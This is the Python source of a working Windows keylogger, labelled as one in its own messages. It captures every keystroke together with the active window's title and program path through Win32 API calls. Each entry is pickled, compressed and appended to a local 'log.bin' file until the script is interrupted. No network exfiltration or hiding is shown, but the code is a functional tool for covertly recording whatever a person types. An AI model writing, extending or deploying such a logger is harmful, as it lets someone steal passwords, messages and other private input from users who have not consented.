import modules.keyboard as kbd
from pickle import dumps
from bz2 import compress
from os.path import exists
from ctypes import windll, create_unicode_buffer
from sys import exit

# Constants
ENTRY_SEPARATOR = b"fHwwYjExMDF8MHhERUFEQkVFRnx8"
SESSION_SEPARATOR = b"fDVFNTUxMDd8"
FILEPATH = "log.bin"
DEBUG = True

class window:
    """Class for handling window-related stuff"""

    # Get DLL
    dll = windll.user32

    def __init__(self): ...

    def title(self):
        """Retrieves title of foreground window with the help of Win32 API"""

        # Retrieve handle of active window
        window_handle = self.dll.GetForegroundWindow()

        # Create unicode buffer of appropriate length
        length = self.dll.GetWindowTextLengthW(window_handle)
        buffer = create_unicode_buffer(length + 1)

        # Flush window title text to buffer
        self.dll.GetWindowTextW(window_handle, buffer, length + 1)

        # Return buffer value, or "" if blank
        return str(buffer.value) if buffer.value else ""

    def path(self):
        """Retrieve module path of window with the help of Win32 API"""

        # Retrieve handle of foreground window
        window_handle = self.dll.GetForegroundWindow()

        # Create unicode buffer of a large length
        buffer = create_unicode_buffer(999)
        self.dll.GetWindowModuleFileNameW(window_handle, buffer, 999)

        # Return buffer value, or "" if blank
        return str(buffer.value) if buffer.value else ""


# Create file if it doesn't exists
if DEBUG:
    print("I: Logging to", FILEPATH)
if not exists(FILEPATH):
    if DEBUG:
        print(f"W: File {FILEPATH} not found - creating file")
    open(FILEPATH, "wb+").close()

# Start logging
try:
    with open(FILEPATH, "ab+") as file:
        if DEBUG:
            print("I: Successfully opened file for logging")
        # Initialize new session
        file.write(SESSION_SEPARATOR)
        while True:
            # Create dictionary object for log entry
            event: kbd.KeyboardEvent = kbd.read_event() # type: ignore
            entry: dict[str, str | int | float] = {
                "event": repr(event)[14:][:-1], # type: ignore
                "title": window().title(),
                "time": event.time, # type: ignore
                "path": window().path(),
            }

            # Write to log
            if DEBUG:
                print(f"I: Keyboard event {entry['event']} logged at {entry['time']}")
            file.write(compress(dumps(entry)))
            file.write(ENTRY_SEPARATOR)
            file.flush()
except KeyboardInterrupt:
    if DEBUG:
        print("E: Keyboard interrupt triggered - stopping key logger")
        exit()